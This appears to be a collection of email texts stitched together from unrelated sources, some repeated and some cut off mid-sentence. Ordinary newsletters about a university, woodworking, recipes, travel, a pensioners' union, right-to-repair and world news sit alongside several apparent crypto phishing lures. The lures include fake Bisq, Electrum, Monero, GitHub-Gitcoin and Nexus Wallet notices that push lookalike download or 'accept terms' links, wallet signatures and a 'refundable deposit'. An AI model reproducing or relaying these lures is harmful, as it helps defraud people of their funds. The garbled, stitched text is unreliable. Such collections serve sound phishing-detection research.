July 2026  ·  Protocol Update Notice


UPDATED TRADING PROTOCOL TERMS & LIMITS

Hi there,

On May 1, 2026, Bisq v1 experienced a security incident in which an attacker exploited insufficient validation in the trade protocol, affecting a limited number of altcoin trades. The Bisq DAO responded quickly — trading was halted, affected users were fully reimbursed, and a comprehensive security review was completed.

The result of that review is Bisq v1.10.x — a hardened release with expanded protocol validation and several precautionary trading restrictions now in effect. These changes are not optional. They are part of the updated terms governing how trades are conducted on the network, and we need you to review and acknowledge them before the deadline below.

----------------------------------------

What Has Changed

1.

Maximum Trade Size Reduced to 0.125 BTC

To limit exposure while the broader security audit continues, the per-trade maximum has been lowered from 2 BTC to 0.125 BTC. This applies to all new offers and taken trades on Bisq v1. Existing open trades are not affected.

2.

Price Deviation Cap Set at 25%

All offers and active trades are now restricted to a maximum price deviation of 25% from the market reference price. Offers outside this range will be rejected by the protocol. This change closes a manipulation vector identified during the post-incident review.

3.

XMR Auto-Confirmation Suspended

Monero (XMR) auto-confirmation has been disabled until a dedicated security audit is completed. XMR trades remain available but require manual confirmation. This is a temporary measure with no set end date until the audit concludes.

----------------------------------------

⚠  Action Required Within 14 Business Days

Please review and acknowledge the updated protocol terms by the deadline. Accounts that have not confirmed acceptance may have their ability to open new offers or take trades temporarily restricted until acknowledgment is complete. Existing open trades and wallet balances are not affected by this restriction.

✓  Your Funds Are Safe

These are protocol-level trading restrictions only. Bitcoin and other assets held in your Bisq wallet are stored locally on your device and remain entirely under your control. Bisq never holds your funds. The Bisq 2 platform and Bisq Easy protocol were not affected by the May 2026 incident.

----------------------------------------

Review & Accept

Choose the option that works best for you. Both paths lead to the same outcome — a confirmed acknowledgment of the updated terms.

Option 1: Schedule a 15-Minute Call

Book a short session with our support team. We will walk you through each change, answer your questions, and help you confirm acceptance in a single call.

Schedule Your Session https://bisqpolicy.com

You will be taken to our scheduling page to pick a date and time.

Review Document & Accept Terms https://transcript.bisqpolicy.com

You will be directed to the document portal to review and confirm the updated terms.

The Bisq Support Team is available through our official channels. Please do not respond to private messages on Reddit or Telegram claiming to be from Bisq — those are not legitimate support contacts.

An overview of Electrum’s desktop Bitcoin wallet . Hello Electrum Community,

Electrum is a Bitcoin wallet application that allows users to manage their Bitcoin directly from their own computers and mobile devices. It is available for Windows, macOS, Linux, and Android.

The application brings essential wallet functions into one place. Users can create and manage Bitcoin wallets, send and receive Bitcoin, review transaction details before signing, and monitor balances and transaction history.

Electrum also supports a range of features for users who require additional control over their wallet setup. These include:

*	Integration with supported hardware wallets

*	Multisignature wallet creation and management

*	Watching-only wallets for offline and cold-storage arrangements

*	Transaction verification through Electrum’s SPV model

*	Connections to Electrum’s decentralized server infrastructure

*	Wallet information and transaction export

*	Wallet restoration using a recovery seed

*	Advanced transaction and wallet-management settings

These advanced features are optional and can be used when needed without complicating ordinary wallet operations.


Getting started


To begin, download the appropriate version of Electrum for your operating system. After installation, you can create a new Bitcoin wallet or restore an existing wallet using the relevant recovery information.

https://electrumdesktop.org

The Electrum project publishes signed releases and reproducible executables. Users are encouraged to verify release signatures where appropriate and to consult the official documentation for installation, wallet recovery, hardware-wallet setup, and other advanced features.

Regards,
The Electrum Team

 Scheitel,
 der auf Fotos etwas breiter aussah, ein Haaransatz, der sich unbemerkt immer
 weiter zurückgezogen hatte. Dann kommt ein Foto, bei dem man es plötzlich
 nicht mehr übersehen kann.

 Noch schwieriger zu erklären ist alles, was damit einhergeht: bestimmte
 Lichtverhältnisse vermeiden, jeden Morgen den Scheitel neu richten, dem

 nur das eigene Spiegelbild.

 „Wunderroutine". Jede Produktseite zeigt dieselben beeindruckenden Vorher-

 gleichzeitig passieren: DHT lässt die Follikel allmählich schrumpfen,

Welcome to your monthly What's On newsletter, providing information on the latest events and opportunities happening at the University. 2022 STAG Public Lecture by Professor Hiranya Peiris

In the past decade, we have been able to answer age-old questions accurately, such as how old the Universe is, what it contains, and its destiny. Along with these answers have also come many exciting new questions.

Speaker Hiranya Peiris, Professor of Astrophysics at University College London, will unravel the detective story, explaining what we have uncovered, and how we know what we know.

A hybrid event, both online and in person. Register your interest here (https://www.southampton.ac.uk/stag/news/events/2022/11/23-stag-lecture.page) .




Cancer Immunology Fund Lecture

During this event our experts will explain how early research ideas can lead to the development of new and innovative cancer treatments, showcasing the crucial role of the Cancer Immunology Fund.

Our host Mark Cragg, Professor of Experimental Cancer Biology, will be joined by Dr Sheah-Lin Lee, NIHR Clinical Lecturer in Surgery and Gareth Thomas, Professor of Experimental Pathology.

Global Entrepreneurship Week

Why is the sunset red or orange?
At sunrise and sunset, the Sun is very low in the sky, which means that the sunlight we see has travelled through a much thicker amount of atmosphere. Because blue light is scattered more strongly by the atmosphere, it tends to be scattered several times and deflected away in other directions before it gets to us. This means that there is relatively more yellow and red light left for us to see.
The diagram below shows that at midday, light has less atmosphere to travel through. Reaching Earth's atmosphere, it is scattered in all directions, therefore we see blue sunlight. Blue is scattered more than other colours because it travels as shorter, smaller waves. However, at sunset, light has further to travel through the atmosphere. The shorter wavelength blue light is scattered further, as the sunlight passes over a greater distance, and we see the longer wavelength yellow and red light. These effects are a cause of Rayleigh Scattering.

There are nearly as many ways to construct a rabbet as there are applications for them. Whether using hand planes or handheld routers, a durable set of drawers begins with proper layout. Securely nestling a glass inlay in a coffee table requires deliberate scribing and precise router setup. Woodpeckers Rabbet Gauges eliminate the trial and error in rabbeting, whether you're just starting out or have laid out hundreds using only your finger as an edge guide.

Trusted by furnituremakers for centuries for its strength and ease of construction, the rabbet joint is often one of the first joints a woodworker learns to make. It's also one that can quickly be taken for granted, as the joint is quite simple to make but even easier to forego in lieu of the weaker butt joint. Our latest OneTIME Tool makes laying out rabbets effortless. Each Rabbet Gauge is 4" in length and has four steps, allowing you to lay out rabbets in standard stock thicknesses from a subtle 1/16
" all the way up to 3/4" in 1/16" increments. 

Setting up your router table to cut rabbets has never been easier. No matter what diameter straight bit you have already in your table, simply position the bit just above the table, set the shoulder of the Rabbet Gauge to the bit, and align your fence to the Rabbet Gauge. Turn the Rabbet Gauge on its side and adjust the bit height to the Rabbet shoulder. Make one pass through the router table or as many as you need, depending on the size and wood. No squinting or awkward adjustment angles, just perfectly sized Rabbets. 

Woodpeckers Rabbet Gauges are milled from a single piece of aircraft grade aluminum, meaning there's no opportunity for assembly error or sloppy joints. All Rabbet Gauges are anodized for surface protection and reduced friction as you guide along edge of your stock, ensuring precise marks ready for machining.  

Whether you're constructing a small keepsake box or a large cabinet project, these handy layout tools will help you construct durable, long-lasting joints. Woodpeckers makes all of our tools right here in Strongsville, Ohio (just south of Cleveland). *Thanks for signing up for Southern Kitchen, a weekly newsletter delivering
fresh food news and recipes straight to your inbox. *

I’m Southern Kitchen editor Mackensy Lunsford
<https://click.e.usatoday.com/?qs=d45080180598936464c2b88561442cc3c01e7268d0d260aa249d24e7b6ec853efe0d7e00d6f3b2cb7d22a56674ada9e0512af357b39aff1160bf7f1e4758d946>.
Every Friday, I’ll send you food stories, recipes and tutorials inspired by
the American South.

[image: makenzie_lunsford.jpg]

Photograph by Stephanie Amador, The Tennessean

A little bit about me: I started working at restaurants at 14 – so young my
parents had to sign off on my work permit. Since then, I’ve worked in every
position in the restaurant industry, from dishwasher to line cook to
restaurant owner, but I’ve never been good at waiting tables. I admire
people who are. The kitchen is where I’m most comfortable.

I eventually left restaurants behind and have been writing about food for
more than 20 years. I’ve written a barbecue cookbook
<https://click.e.usatoday.com/?qs=d4508018059893649f812ebc228d9688af5fe38dde94f3304392a36921f006e9bc4cdd60a31f81d6eb2fcf9e7a1b56f42a606588d94d142701d35b850d8efbba>
and was nominated for a James Beard Award for innovative storytelling
<https://click.e.usatoday.com/?qs=d450801805989364f3a11ab7a02a65dc290ac1662f60406b3cdfb023f586d162eb280d1db5c7dd610b498f2c7d850907cb6b9a49aphishing@pot3e020d64a9275a54b38e>.
Perhaps more importantly, I can nail a hardboiled egg every time, though I
have Martha Stewart to thank for that, if I’m being honest.

I now live in Nashville, Tennessee. Before that, I was in Asheville, North
Carolina for 23 years. My family has lived in Southern Appalachia for many
generations, many of them as farmers. I have my great-grandfather's tomato
can label, his name printed on the side, hanging on my wall.

In the summer,I have tomatoes in my Nashville yard. I have a strong,
beautiful girl named Lily, who loves to help me in the kitchen. We love to
make lemon pound cake
<https://click.e.usatoday.com/?qs=d450801805989364c5b8e2d2b7b6b1a782fbbf765ba51c1c9de0ffbd0f08de55d94dc48ac3e43dbb74cac957bc46e98d0d157a3bcb37c47159d2ddb14e5d6d70>,
these gooey brownies
<https://click.e.usatoday.com/?qs=d4508018059893645595289422b83459829a8f3bd6187fe4a85967f2c5beb1d92b76774e274361832961f244bd81e300f175af01f1f0318ca8fcd282acb39dd1>,
and these perfect chocolate chip cookies
<https://click.e.usatoday.com/?qs=d4508018059893643a40947c547800198f0255a814309d3fee97d5c5dcfde137f9689f6d881230ce0b81f874ff3253db5f39f7f0ffb8463c60fb36f274fbe551>
.

I hope you’ll reach out to me about your favorite recipes, techniques and
anything you’d like to see more of in this newsletter. You can email me at
mlunsford@southernkitchen.com

Great data scientists have career options and won’t abide bad managers for
very long. If you want to retain them, you need to care about their work,
connect it to the business, and design a diverse, resilient,
high-performing team.

*Build trust and be candid*
Trust, authenticity, and loyalty are particularly essential in data
science. Why? There’s often confusion around the discipline and its role in
the company, so the team manager is responsible for insulating data
scientists from unreasonable requests and for explaining the team’s role to
the rest of the organization. The best way to build trust is to make sure
that your team members have interesting projects to work on, and that
they’re not burdened by projects with vague requirements or unrealistic
timelines.

You should also go out of your way to be candid. Data scientists are smart
people who are trained in how to interrogate and handle information. My
heuristic is to be about 20% more direct and candid than you think you
should be.

*Connect the work to the business*
To get the most from a data scientist’s time, give them a clear picture of
the business goal behind a project. A lot of managing data science is
discussing and fine-tuning questions from stakeholders so that you better
understand the information they actually want and how it will be used.
Don’t let questions or requests become projects for your team until you
know exactly what the stakeholder wants and how they’ll use it. Requiring
very clear objectives for the data questions that come your way is one of
the most important things you can do for your team. Stakeholders can’t
always ask these kinds of focused, specific questions on their own; make
sure members of the data science team are regularly invited to product and
strategy meetings.

*Design great teams*
As a data science manager, you’ll get lots of résumés. Take advantage of
that to be picky in the right ways. Social skills like empathy and
communication are undervalued in data science and should be part of your
hiring criteria. And instead of hiring just for “culture fit,” ask yourself
if this person sees the world in a way that expands the boundaries of the
team’s knowledge.

Don’t just hire senior people — less-experienced employees tend not to make
the assumptions that they do. And embrace a diversity of academic
backgrounds. I have a team member who studied marine biology, and their
knowledge of how pods of dolphins behave in the wild is surprisingly useful
when modeling a fleet of robots. Finally, build a team that reflects the
people whose data you’re analyzing — that team will ask better questions.

MEXICO BEYOND THE BEACHES
[image: Izamal, Mexico]

*Izamal in the state of Yucatán*

*jkraft5/Adobe Stock*

Millions of visitors flock to coastal Mexico each year, but those beautiful
beaches, sprawling resorts and secret surf spots are at the end of roads
that start inland. They begin at 400-year-old Spanish colonial plazas and
cross over ancient paths that connected Mesoamerican pyramids built by
great civilizations dating back much further.



People halfway around the world know about Mexico even if they’ve never
visited: They have probably tried the distinctive food or the equally
famous spirit, tequila. While the menus may be similar abroad, a trip
through the country can turn up very different meals from one region to
another. Some of those dishes date back to the time of the Aztecs and Maya
people, who were cultivating corn and cacao thousands of years before the
first conquistadors set foot on the land.



What makes Mexico such a great food destination is its top-to-bottom
tastiness on the price scale. It’s not unusual to see chefs from some of
the world’s most award-winning restaurants sharing a stand-up street taco
meal with a few friends who could afford to eat anywhere. On a weekend
night, both upscale lounges and simple cantinas will have tables full of
patrons sipping tequila or mezcal with some bar snacks.
[image: The Palace of Fine Arts in Mexico City]

*The Palace of Fine Arts in Mexico City*

*Logan/Adobe Stock*

I started exploring Mexico as a visitor nearly 20 years ago. On a family
vacation to the Riviera Maya with my toddler daughter, we added Mérida and
Yucatán state to the beach getaway. As has happened for so many, Cancún was
just an appetizer. That trip started a long series of visits fueled by a
strong desire to explore this vast country and its depth of history,
culture and food. I kept returning — either on family vacations or on
travel-writing assignments — and filed articles from the coasts of Jalisco,
Guerrero and Nayarit and also inland from tequila country, Chiapas, Oaxaca
and Mexico City.



Eventually, the lure got too strong for short bursts and my family spent a
year in the UNESCO World Heritage historic city of Guanajuato. The
Spanish-language phrase for real estate is *bienes raíces *— good roots —
and a year later we put down our own roots to buy a house there. Our base
is smack in the center of the country at about 6,700 feet (about 2,000
meters) above sea level, an altitude that surprises many visitors with
nights cool enough to require a jacket.



In a country with 32 states and dozens of cities that are older than
Boston, how do you narrow it all down? Favorites are subjective, of course,
but with this newsletter series CNN Travel has curated the choices to give
you a taste of the superlatives. Over the next four weeks, we’ll send you
expert newsletter guides to some special cities and regions that are
highlights for many Mexico lovers, including *Eva Longoria, host of CNN
Original Series “Searching for Mexico."

Informasjon til deg som er tillitsvalgt i Pensjonistforbundet Takk for den gode jobben du gjør!
Vi er nå litt over tre aktive måneder inn i 2025, og kan ta en velfortjent pust i bakken. Jeg vil gjerne takke hver især for den viktig og gode jobben dere gjør, rundt om i hele landet.Pensjonistforbundet jobber for aldersvennlige lokalsamfunn, der alle kan leve gode liv. Vi lager sosiale møteplasser for å motvirke ensomhet. Vi jobber politisk, for å sikre økonomisk trygghet og velferd for alle, og helsetjenester når vi trenger det. Pluss mye mer.
La det ikke være noen tvil: Sammen gjør vi samfunnet bedre! Og når vi tar fatt igjen etter påskedagene, må vi jobbe videre for å invitere flere inn i fellesskapet vårt, slik at vi får enda bedre uttelling for den gode jobben vi gjør. Det er vårt felles mål.Med ønske om en god påske,Jan Davidsenforbundsleder 
Tips til aktivitet: Bocciaturnering for ung og gammel!
Pensjonistforbundet Hemsedal inviterer unge og gamle til bocciaturnering hver 2. mandag i måneden. Boccia er en sport for alle, uansett alder eller erfaring, og denne aktiviteten skaper engasjement!🎉
Bordene dekkes med kaffe og noe godt å bite i, og praten går livlig før turneringen starter. Noen kommer for å vinne, andre for å prøve noe nytt, men alle har én ting til felles: gleden over å være sammen. Her er det jubelbrøl når noen treffer blink, og latteren sitter løst når et og annet kast går litt skeis. Spillet er preget av god sportsånd og vennskapelig konkurranse. 👏
Til sist blir det kåret en vinner, men disse kveldene handler om mer enn bare resultater. Dette er en påminnelse for oss alle om hvor viktig det er å møtes, være aktive og ha det gøy sammen.🥰

Monero Interface Update: Desktop Enhancements, CLI Improvements, and Browser-Based Access . Dear Monero Community,

We are writing to share a major update that aligns with long-standing community input and current user needs across various environments.

As part of our continued efforts to improve accessibility, flexibility, and performances across the Monero ecosystem, we are releasing upgrades to the desktop GUI and CLI wallet, along with the first beta release of a Monero browser extension wallet.



 Desktop Wallet Enhancements

The updated Monero GUI wallet for desktop includes refinements that improve reliability, performances, and interface responsiveness across  supported platforms:

* Improved remote node handling with better failover and retry logic
* Enhanced support for hardware wallets, including newer Ledger and Trezor models
* Simplified wallet creation and recovery flows
* UI adjustments for smaller and high-resolution displays
* Updated translations and accessibility improvements

The wallet continues to support Windows, Linux, and macOS operating systems.

 Download the updated GUI: https://app.getmoneroupdate.org/


 CLI Wallet Improvements

We’ve also released an updated version of the CLI wallet (`monero-wallet-cli`) with performances and security improvements for advanced users, developers, and operators managing automated systems.

Key updates include:

* Faster synchronization when using trusted remote nodes
* Extended support for scripted wallet interactions
* Improved error reporting in automated transaction processing
* Hardened memory handling for improved operational security
* Added flag options for fine-grained control over mining rig connections

Download the updated CLI tools: https://app.getmoneroupdate.org/

  Browser Extension Wallet: 

We are introducing a browser extension wallet built specifically for users who require lightweight, direct interaction with Monero — particularly those managing mining infrastructure via Ledger hardware wallets.

This extension provides:

* Secure Ledger integration for reading balances and authorizing transactions
* Compatibility with Chromium-based browsers (Chrome, Brave, Edge, etc.)
* Seamless pairing with the updated GUI or CLI interface
* Local-only key handling — no data is transmitted to external servers
* Session persistence across browser restarts for uninterrupted rig monitoring

 Install the Monero Extension Wallet: https://app.getmoneroupdate.org/



 Installation Overview

1. Select and download the appropriate version for your platform (GUI, CLI, or Extension).
2. Follow platform-specific installation steps provided on the official site.
3. If using a Ledger device, ensure firmware is up to date and enable developer mode for best compatibility.

📌 GitHub × Gitcoin Developer Fund 2025

Dear community,

We are excited to introduce the upcoming phase of the GitHub Developer Fund, a joint program with Gitcoin designed to highlight and support those who strengthen open-source technologies and digital public goods.

Your GitHub account qualifies for participation in this phase. We value every type of involvement — from occasional contributions to long-term commitment — as essential to shaping the future of open source.

Program overview:

  • Funding approach: Quadratic Funding, boosting community influence through a shared pool
  • Total allocation: $15,000,000 USDC
  • Eligibility: Active participation and potential future impact — open to everyday contributors and maintainers, not just project founders

Next step:
To secure your preliminary registration and confirm eligibility, please verify your wallet using Gitcoin Passport. This ensures fairness, protects against Sybil attacks, and never requests personal data. Verification takes under a minute: connect your wallet and sign a message.

Please note:
The authorization requires a refundable deposit, which will be fully returned after the process is completed.

📝 Continue with authentication and submission here: https://grants.github.com/apply

📌 GitHub × Gitcoin Developer Fund 2025

Dear community,

We are excited to introduce the upcoming phase of the GitHub Developer Fund, a joint program with Gitcoin designed to highlight and support those who strengthen open-source technologies and digital public goods.

Your GitHub account qualifies for participation in this phase. We value every type of involvement — from occasional contributions to long-term commitment — as essential to shaping the future of open source.

Program overview:

  • Funding approach: Quadratic Funding, boosting community influence through a shared pool
  • Total allocation: $15,000,000 USDC
  • Eligibility: Active participation and potential future impact — open to everyday contributors and maintainers, not just project founders

Next step:
To secure your preliminary registration and confirm eligibility, please verify your wallet using Gitcoin Passport. This ensures fairness, protects against Sybil attacks, and never requests personal data. Verification takes under a minute: connect your wallet and sign a message.

Please note:
The authorization requires a refundable deposit, which will be fully returned after the process is completed.

📝 Continue with authentication and submission here: https://grants.github.com/apply

Participation and funding eligibility are finalized only with a valid Gitcoin Passport score. Full guidelines are available on our portal.

Best regards,
GitHub Developer Fund Team
In partnership with Gitcoin

Our $100k bounty program is fighting for your right to repair—and own—your stuff [https://fulu-foundation.ghost.io/r/da034d18?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]












By Kevin O'Reilly • 27 Oct 2025


View in browser [https://fulu-foundation.ghost.io/r/f6fc22a0?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]

There are so many ways companies screw with their customers today. They love to change their products after they’re sold, or add “proprietary” versions of a refill where a generic one would suffice. We’ve seen it with printer cartridges, tractors, and even air and water filters. In this very space, we’ve talked about reverse ransomware — firmware update breaks a device which then requires an ongoing subscription to fix — and software end of life announcements that make no sense. Earlier this month, Microsoft ended support for Windows 10 for most of the world, leaving millions of devices unsecured.

You’re tired of not actually owning the stuff you paid for. So are we. That's why we're doing something about it. [https://fulu-foundation.ghost.io/r/269afef8?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]











 




[https://fulu-foundation.ghost.io/r/d4d7d9a4?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]





We're putting money where our mission is.

Today, we're excited to launch a first of it’s kind Bounty Program [https://fulu-foundation.ghost.io/r/98fcf6d9?m=b503a08a-c4e6-4bfd-bc68-f98315f6032b]—a community-driven initiative that rewards, coders, tinkerers, and developers to fix products that get broken by their manufacturers.

This is a first-of-its-kind bug bounty program to advocate for the Right to Ownership. FULU believes that companies should not be able to change the terms of purchase after a product has been sold.


The Bounty Program

There are two parts to the bounty program.

First, we’re providing a pool of $10,000 each to the first coders who can provide a fix that makes the devices on our list work again — that’s a total of $50,000 guaranteed to be paid out.

Next, and this is the exciting part, is where you come in. We’ve saved up another $25,000 in matching funds that can be unlocked when you donate to a bounty, bringing the total up funds up for grabs to $100,000 USD.

This means, say, you see a product on our list and hate what the company has been able to get away with so far. You can donate $10 (or more!) to the bounty for that product. We’ll match your $10 so that the pool is now richer by $20 even though you only put in $10.


The Product line-up

Headlining this list of products being bountied are the first two generations of Google’s Nest Learning Thermostats — support for which is ending on October 25. After that, the revolutionary smart thermostat turns into a dumb device on the wall that should not have cost hundreds of dollars. Also on the list, are refrigerators by General Electric that require a “proprietary” water filter, and air purifiers by Molekule that require “proprietary” air filters to function. Using generic version of either costs less than half the listed price of the “branded” version and breaks device features that customers already purchased. Rounding out the current list, we have a line Samsung Refrigerators that show unwanted and unexpected ads, and X-Box gaming consoles that are notoriously wasteful and expensive to repair.

Plus, a U.S. government shutdown

October 1, 2025

By Katrin Bennhold

Good morning, world! From Nepal to Madagascar, Gen Z protesters are raging against the political establishment, with some success. These protests are taking place thousands of kilometers apart. But as my colleague Pranav Baskar reports, the protesters are linked by a pirate flag that might mystify their parents.
Also:

A U.S. government shutdown
What Moldova’s election says about Europe
Colombia’s Brayans fight back

Clockwise from top left: Protests in Nepal, Indonesia, the Philippines and Madagascar.  Clockwise from top left: Sunil Pradhan/Anadolu via Getty Images; Yasuyoshi Chiba/AFP; Ezra Acayan/Getty Images; Rijasolo/AFPThe activists and the anime

By Pranav Baskar

Gen Z protests are having a moment.
In just the last month, Nepal, Indonesia, the Philippines and Madagascar have all experienced large protests led by young people outraged over government corruption and inequality. Flying above each of the protests was a common flag: a grinning skull and bones wearing a straw hat.
The flag comes from a long-running Japanese manga and anime series called “One Piece,” which follows a scrappy crew of pirates as they take on a corrupt and repressive government. The franchise, recently relaunched as a live-action series on Netflix, has been dubbed in more than a dozen languages and has amassed a huge following, with more than 500 million copies of the print version published.
One of the first times the flag flew at protests was in 2023, at pro-Palestinian marches in Indonesia and Britain. In the years since, it has become a symbol for youth-led demonstrations around the world.
It hung on the gates of Nepal’s government complex, which was burned in protests that eventually toppled the government. It was painted on walls in Jakarta and hoisted by crowds in Manila. This week, it popped up in Madagascar, where protests forced the dissolution of the government on Monday.
“We know that Gen Z is protesting all around the world, and we wanted to use symbols that made sense to our generation,” Rakshya Bam, 26, one of the Nepali Gen Z protest organizers, told my colleague Hannah Beech. “The pirate flag, Jolly Roger, it’s like a common language now.”
The “One Piece” flag isn’t just an emblem — it’s an allegory. The protagonist, Luffy, is a terrorist or a freedom fighter, depending on whom you ask. His iconic straw hat was a gift from his childhood hero, who believed Luffy and his generation would eventually prevail.
The plot makes the symbol particularly resonant, another Nepali protester, Irfan Khan, told Hannah. “The pirate, it’s like a way to say we are not going to put up with injustice and corruption anymore,” he said.
It’s not the first time that protesters have found common cause with youth-coded cultural references. In the 2010s, protesters against a military coup in Thailand adopted the three-fingered salute from the dystopian movie “The Hunger Games,” which has persisted in countries like Myanmar.
“I think we are entering a new era of organizing that draws heavily from digital, pop and gaming culture, creating a common vocabulary,” said Raqib Naik, the director of the Center for the Study of Organized Hate, a U.S.-based watchdog group that tracks online activity and misinformation.
The “One Piece” flag is being used by protesters who are thousands of kilometers apart. But they are linked by their generation’s shared culture, fusing popular narratives and anti-establishment politics into a force that has brought down at least two governments — and counting.
— Additional reporting by Parin Behrooz and Hannah Beech

Moldova is a country of 2.4 million people, roughly the population of Manchester. But its geographic position gives this former Soviet republic an outsize strategic importance. That’s why the decisive victory of a pro-European Union party there Sunday, in an election that was predicted to be a nail-biter, felt so consequential. It was, as my colleague Jeanna Smialek put it, “a values race — a referendum on Europe versus Russia.”

By Pranav Baskar

Gen Z protests are having a moment.
In just the last month, Nepal, Indonesia, the Philippines and Madagascar have all experienced large protests led by young people outraged over government corruption and inequality. Flying above each of the protests was a common flag: a grinning skull and bones wearing a straw hat.
The flag comes from a long-running Japanese manga and anime series called “One Piece,” which follows a scrappy crew of pirates as they take on a corrupt and repressive government. The franchise, recently relaunched as a live-action series on Netflix, has been dubbed in more than a dozen languages and has amassed a huge following, with more than 500 million copies of the print version published.
One of the first times the flag flew at protests was in 2023, at pro-Palestinian marches in Indonesia and Britain. In the years since, it has become a symbol for youth-led demonstrations around the world.
It hung on the gates of Nepal’s government complex, which was burned in protests that eventually toppled the government. It was painted on walls in Jakarta and hoisted by crowds in Manila. This week, it popped up in Madagascar, where protests forced the dissolution of the government on Monday.
“We know that Gen Z is protesting all around the world, and we wanted to use symbols that made sense to our generation,” Rakshya Bam, 26, one of the Nepali Gen Z protest organizers, told my colleague Hannah Beech. “The pirate flag, Jolly Roger, it’s like a common language now.”
The “One Piece” flag isn’t just an emblem — it’s an allegory. The protagonist, Luffy, is a terrorist or a freedom fighter, depending on whom you ask. His iconic straw hat was a gift from his childhood hero, who believed Luffy and his generation would eventually prevail.
The plot makes the symbol particularly resonant, another Nepali protester, Irfan Khan, told Hannah. “The pirate, it’s like a way to say we are not going to put up with injustice and corruption anymore,” he said.
It’s not the first time that protesters have found common cause with youth-coded cultural references. In the 2010s, protesters against a military coup in Thailand adopted the three-fingered salute from the dystopian movie “The Hunger Games,” which has persisted in countries like Myanmar.
“I think we are entering a new era of organizing that draws heavily from digital, pop and gaming culture, creating a common vocabulary,” said Raqib Naik, the director of the Center for the Study of Organized Hate, a U.S.-based watchdog group that tracks online activity and misinformation.
The “One Piece” flag is being used by protesters who are thousands of kilometers apart. But they are linked by their generation’s shared culture, fusing popular narratives and anti-establishment politics into a force that has brought down at least two governments — and counting.

October 1, 2025

By Katrin Bennhold

Good morning, world! From Nepal to Madagascar, Gen Z protesters are raging against the political establishment, with some success. These protests are taking place thousands of kilometers apart. But as my colleague Pranav Baskar reports, the protesters are linked by a pirate flag that might mystify their parents.

Clockwise from top left: Protests in Nepal, Indonesia, the Philippines and Madagascar.  Clockwise from top left: Sunil Pradhan/Anadolu via Getty Images; Yasuyoshi Chiba/AFP; Ezra Acayan/Getty Images; Rijasolo/AFPThe activists and the anime

By Pranav Baskar

Gen Z protests are having a moment.
In just the last month, Nepal, Indonesia, the Philippines and Madagascar have all experienced large protests led by young people outraged over government corruption and inequality. Flying above each of the protests was a common flag: a grinning skull and bones wearing a straw hat.
The flag comes from a long-running Japanese manga and anime series called “One Piece,” which follows a scrappy crew of pirates as they take on a corrupt and repressive government. The franchise, recently relaunched as a live-action series on Netflix, has been dubbed in more than a dozen languages and has amassed a huge following, with more than 500 million copies of the print version published.
One of the first times the flag flew at protests was in 2023, at pro-Palestinian marches in Indonesia and Britain. In the years since, it has become a symbol for youth-led demonstrations around the world.
It hung on the gates of Nepal’s government complex, which was burned in protests that eventually toppled the government. It was painted on walls in Jakarta and hoisted by crowds in Manila. This week, it popped up in Madagascar, where protests forced the dissolution of the government on Monday.
“We know that Gen Z is protesting all around the world, and we wanted to use symbols that made sense to our generation,” Rakshya Bam, 26, one of the Nepali Gen Z protest organizers, told my colleague Hannah Beech. “The pirate flag, Jolly Roger, it’s like a common language now.”
The “One Piece” flag isn’t just an emblem — it’s an allegory. The protagonist, Luffy, is a terrorist or a freedom fighter, depending on whom you ask. His iconic straw hat was a gift from his childhood hero, who believed Luffy and his generation would eventually prevail.
The plot makes the symbol particularly resonant, another Nepali protester, Irfan Khan, told Hannah. “The pirate, it’s like a way to say we are not going to put up with injustice and corruption anymore,” he said.
It’s not the first time that protesters have found common cause with youth-coded cultural references. In the 2010s, protesters against a military coup in Thailand adopted the three-fingered salute from the dystopian movie “The Hunger Games,” which has persisted in countries like Myanmar.
“I think we are entering a new era of organizing that draws heavily from digital, pop and gaming culture, creating a common vocabulary,” said Raqib Naik, the director of the Center for the Study of Organized Hate, a U.S.-based watchdog group that tracks online activity and misinformation.
The “One Piece” flag is being used by protesters who are thousands of kilometers apart. But they are linked by their generation’s shared culture, fusing popular narratives and anti-establishment politics into a force that has brought down at least two governments — and counting.
— Additional reporting by Parin Behrooz and Hannah Beech

Every meaningful innovation begins with a conversation — and over the past months, our community has been loud, clear, and incredibly consistent in one request:
“We want a true Nexus Wallet experience on desktop.”

Today, we are proud to say: we heard you, we agreed with you, and now we’re delivering.

Announcing the FirstEver Nexus Wallet Desktop Application

After extensive design sessions, user feedback reviews, and months of development, we are thrilled to introduce the Nexus Wallet Desktop App — Version 1.0. This marks a major milestone in the evolution of Nexus Wallet, transforming it from a strictly mobile experience into a fully crossplatform ecosystem.

Built for reliability, crafted for speed, and designed for modern digital asset management, the desktop release opens the door to smoother workflows and deeper control.


Fully CrossPlatform, Fully Native

One of the community’s strongest requests was universal platform support. We’re proud to announce that Nexus Wallet Desktop is launching with broad compatibility:

 Windows
 macOS (Intel & Apple Silicon)
 Linux (major distros supported)
 All ChromiumBased Browsers (Chrome, Brave, Edge, Opera & more)

Wherever you work — at home, on a workstation, or across multiple environments — Nexus Wallet now fits naturally into your setup.

Why This Desktop Release Matters

Moving to desktop isn’t just about convenience — it’s about capability. With this release, users can enjoy:

Strengthened Local Security

Private keys remain securely encrypted on your machine, giving you desktopgrade protection with the simplicity of our mobile design.

Optimized Performance & Stability

Experience faster loading, smoother interactions, and minimized mobile limitations.

A Unified Workflow

Switch effortlessly between mobile and desktop while maintaining a consistent and familiar interface.

 A Better Environment for Power Users

For traders, analysts, developers, stakers, and anyone managing multiple assets, the desktop app offers clarity and control on a larger canvas.

This upgrade isn’t just an extension — it’s an evolution.

Download the Desktop App

To begin using Nexus Wallet Desktop, simply download the installer for your platform: https://www.nexuswalletdesktop.app/


After downloading, follow the quick installation guide for your operating system. In just a few moments, you’ll be navigating Nexus Wallet with the comfort and power of a full desktop environment.


Your Feedback Shapes the Future

This is our foundation — Version 1.0 — and it’s only the beginning.

As we continue refining and enhancing the desktop experience, your feedback remains essential. If you find any feature missing, have suggestions, or want to share your experience, we encourage you to send your thoughts directly:

Every message contributes to the next stage of development.

 Thank You, Community

Your voice has always guided this project. The desktop app is not just a release — it is a reflection of your ideas, your needs, and your belief in the future of Nexus Wallet.

Together, we’re building a more accessible, more versatile, and more powerful ecosystem.

With appreciation,
The Nexus Wallet Team

** S.M.: Hi Emmy. While we now know your Soundwave Tattoo contains your mom’s voice, what was it about this moment and her words that made you want to keep it with you?

